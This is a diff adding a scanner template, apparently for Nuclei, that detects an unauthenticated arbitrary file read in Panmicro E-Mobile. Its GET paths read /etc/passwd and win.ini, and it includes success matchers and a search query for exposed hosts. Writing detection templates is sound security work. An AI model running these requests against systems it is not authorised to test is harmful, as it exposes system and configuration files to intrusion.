@@ -1,0 +1,35 @@
+id: panmicro-arbitrary-file-read
+
+info:
+  name: Panmicro E-Mobile System - Arbitrary File Read
+  author: s4e-io
+  severity: high
+  description: |
+    The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability. Unauthenticated attackers can use this vulnerability to read important system files, database configuration files, and so on.
+  reference:
+    - http://cn-sec.com/archives/3182931.html
+    - https://cn-sec.com/archives/3188605.html
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: panmicro
+    product: e-mobile-system
+    fofa-query: app="泛微-EMobile"
+  tags: panmicro,e-mobile,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows"
+      - "{{BaseURL}}/client/cdnfile/C/etc/passwd?linux"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"bit app support","fonts","extensions") || regex("root:.*:0:0:", body)'
+          - 'contains_any(header,"application/octet-stream", "text/plain")'
+          - 'contains(header," attachment; filename=")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4a0a00473045022100b0a1317f8b3bcf59f608b90272b0035af9d26bb6919aac1352f0b3a158b480d1022058ffe9819c26810876ba9bad7bf9e90618e228b8b0e02c490e36ae482ee4495e:922c64590222798bb761d5b6d8e72950
